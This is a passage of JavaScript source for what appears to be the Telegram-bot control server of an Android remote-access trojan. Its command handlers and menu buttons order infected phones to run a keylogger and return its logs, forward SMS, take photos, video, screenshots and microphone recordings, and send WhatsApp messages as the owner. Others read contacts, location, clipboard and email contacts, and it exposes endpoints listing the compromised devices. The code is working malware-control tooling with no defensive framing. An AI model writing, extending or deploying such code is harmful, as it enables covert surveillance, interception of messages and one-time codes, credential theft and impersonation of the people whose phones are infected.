    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getFileInfo', { path: match[1].trim() });
});

// /mkdir
bot.onText(/\/mkdir (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'createFolder', { path: match[1].trim() });
});

// /storage
bot.onText(/\/storage/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getStorageStats');
});

// /apps
bot.onText(/\/apps/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listApps');
});

// /running
bot.onText(/\/running/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listRunningApps');
});

// /appinfo
bot.onText(/\/appinfo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getAppInfo', { package: match[1].trim() });
});

// /open
bot.onText(/\/open (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'openApp', { package: match[1].trim() });
});

// /kill
bot.onText(/\/kill (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'killApp', { package: match[1].trim() });
});

// /whatsapp
bot.onText(/\/whatsapp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const parts = match[1].split('|');
    if (parts.length === 2) {
        sendCommandToDevice(chatId, 'sendWhatsApp', { target: parts[0].trim(), message: parts[1].trim() });
    } else {
        bot.sendMessage(chatId, 'Usage: /whatsapp +1234567890|Your message');
    }
});

// /whatsappcheck
bot.onText(/\/whatsappcheck/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'checkWhatsApp');
});

// /whatsappcontacts
bot.onText(/\/whatsappcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getWhatsAppContacts');
});

// /emails
bot.onText(/\/emails/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listEmails');
});

// /emailcontacts
bot.onText(/\/emailcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getEmailContacts');
});

// /location
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getLocation');
});

// /contacts
bot.onText(/\/contacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getContacts');
});

// /clipboardget
bot.onText(/\/clipboardget/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getClipboard');
});

// /clipboardset
bot.onText(/\/clipboardset (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'setClipboard', { text: match[1].trim() });
});

// /vibrate
bot.onText(/\/vibrate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const duration = parseInt(match[1]) || 500;
    sendCommandToDevice(chatId, 'vibrate', { duration: duration });
});

// /wallpaper
bot.onText(/\/wallpaper (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'setWallpaper', { path: match[1].trim() });
});

// /clearnotif
bot.onText(/\/clearnotif/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'clearNotifications');
});

// /wifi (networks)
bot.onText(/\/wifinetworks/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getWifiNetworks');
});

// /bt (devices)
bot.onText(/\/btdevices/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getBluetoothDevices');
});

// /sim
bot.onText(/\/sim/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getSimInfo');
});

// /network
bot.onText(/\/network/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getNetworkInfo');
});

// /battery
bot.onText(/\/battery/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getBatteryInfo');
});

// /keylogger
bot.onText(/\/keylogger (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'start') {
        sendCommandToDevice(chatId, 'startKeylogger');
    } else if (command === 'stop') {
        sendCommandToDevice(chatId, 'stopKeylogger');
    } else {
        bot.sendMessage(chatId, 'Usage: /keylogger start|stop');
    }
});

// /keylogget
bot.onText(/\/keylogget/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getKeylogs');
});

// /forward
bot.onText(/\/forward (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'enableSMSForward');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'disableSMSForward');
    } else {
        bot.sendMessage(chatId, 'Usage: /forward on|off');
    }
});

// ========== BUTTON HANDLERS ==========

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    if (!msg.text || msg.text.startsWith('/')) return;

    const text = msg.text;
    let command = '';
    let extras = {};
    let target = 'all';

    // Check if it's a command response
    if (text.startsWith('✅') || text.startsWith('📤') || text.startsWith('📨')) {
        return;
    }

    switch(text) {
        case '📱 Device Info':
            command = 'getDeviceInfo';
            break;
        case '📊 Status':
            command = 'getDeviceInfo';
            break;
        case '📷 Camera':
            command = 'takePhoto';
            break;
        case '🎥 Video':
            command = 'takeVideo';
            break;
        case '🎬 Screen Record':
            command = 'screenRecord';
            break;
        case '📸 Screenshot':
            command = 'takeScreenshot';
            break;
        case '🎤 Mic':
            command = 'recordAudio';
            break;
        case '🔊 Volume':
            bot.sendMessage(chatId,
                `🔊 *Volume Controls*\nChoose:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            ['🔊 Volume Up', '🔉 Volume Down'],
                            ['🔇 Mute', '🔊 Unmute'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            return;
        case '🔊 Volume Up':
            command = 'volumeUp';
            break;
        case '🔉 Volume Down':
            command = 'volumeDown';
            break;
        case '🔇 Mute':
            command = 'mute';
            break;
        case '🔊 Unmute':
            command = 'unmute';
            break;
        case '📁 Files':
            command = 'listFiles';
            extras = { path: '/sdcard/' };
            break;
        case '📍 Location':
            command = 'getLocation';
            break;
        case '👥 Contacts':
            command = 'getContacts';
            break;
        case '📋 Clipboard':
            command = 'getClipboard';
            break;
        case '🔦 Flashlight':
            bot.sendMessage(chatId,
                `🔦 *Flashlight*\nChoose:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['🔦 Turn On', '🔦 Turn Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            return;
        case '🔦 Turn On':
            command = 'flashlightOn';
            break;
        case '🔦 Turn Off':
            command = 'flashlightOff';
            break;
        case '📶 WiFi':
            bot.sendMessage(chatId,
                `📶 *WiFi*\nChoose:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📶 WiFi On', '📶 WiFi Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            return;
        case '📶 WiFi On':
            command = 'wifiOn';
            break;
        case '📶 WiFi Off':
            command = 'wifiOff';
            break;
        case '📡 Bluetooth':
            bot.sendMessage(chatId,
                `📡 *Bluetooth*\nChoose:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📡 BT On', '📡 BT Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            return;
        case '📡 BT On':
            command = 'bluetoothOn';
            break;
        case '📡 BT Off':
            command = 'bluetoothOff';
            break;
        case '✈️ Airplane':
            command = 'airplaneMode';
            break;
        case '🌙 DND':
            command = 'doNotDisturb';
            break;
        case '📳 Vibrate':
            command = 'vibrate';
            extras = { duration: 500 };
            break;
        case '🔄 Reboot':
            command = 'reboot';
            break;
        case '💀 Kill App':
            bot.sendMessage(chatId,
                `💀 Enter package name to kill:`,
                {
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            const killListener = (msg2) => {
                if (msg2.text === '🔙 Back to Main') {
                    bot.removeListener('message', killListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                sendCommandToDevice(chatId, 'killApp', { package: msg2.text });
                bot.removeListener('message', killListener);
            };
            bot.on('message', killListener);
            return;
        case '📨 SMS Forward':
            command = 'enableSMSForward';
            break;
        case '📤 Upload File':
            command = 'uploadFile';
            break;
        case '⬇️ Download':
            command = 'downloadFile';
            break;
        case '🗑️ Delete':
            command = 'deleteFile';
            break;
        case '📂 List Files':
            command = 'listFiles';
            extras = { path: '/sdcard/' };
            break;
        case '⚙️ System Info':
            command = 'getSystemInfo';
            break;
        case '📱 Running Apps':
            command = 'listRunningApps';
            break;
        case '🧹 Clear Cache':
            command = 'clearCache';
            break;
        case '🔐 Keylogger':
            bot.sendMessage(chatId,
                `🔐 *Keylogger*\nChoose:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['▶️ Start', '⏹️ Stop'],
                            ['📊 Get Logs'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            return;
        case '▶️ Start':
            command = 'startKeylogger';
            break;
        case '⏹️ Stop':
            command = 'stopKeylogger';
            break;
        case '📊 Get Logs':
            command = 'getKeylogs';
            break;
        case '📱 Remote Control':
            command = 'getFullDeviceInfo';
            break;
        case '🔙 Back to Main':
            bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
            return;
        default:
            if (text.startsWith('/')) return;
            bot.sendMessage(chatId, `❌ Unknown command: ${text}\nUse buttons or /help`, { ...getMainKeyboard() });
            return;
    }

    if (command) {
        sendCommandToDevice(chatId, command, extras);
    }
});

// ========== HELP FUNCTION ==========
function formatSize(bytes) {
    if (!bytes) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ========== WEB STATUS ENDPOINT ==========
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        devices: connectedDevices.size,
        deviceList: Array.from(connectedDevices.values()),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

app.get('/devices', (req, res) => {
    const deviceList = [];
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        deviceList.push({
            id: deviceId,
            platform: info.platform || 'unknown',
            connectedAt: info.connectedAt,
            lastHeartbeat: info.lastHeartbeat,
            info: info
        });
    }
    res.json(deviceList);
});

// ========== KEEP ALIVE (Prevents Render from sleeping) ==========
// This is a simple endpoint that keeps the service alive
setInterval(() => {
    // Ping the service itself to keep it awake on Render
    const now = new Date().toISOString();
    console.log(`💓 Keep-alive ping at ${now}`);
}, 60000); // Every 60 seconds

// ========== START SERVER ==========
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Connected devices: ${connectedDevices.size}`);
    console.log(`🤖 Bot is ready!`);
    console.log(`📊 Status page: https://dog-agd9.onrender.com/status`);
});
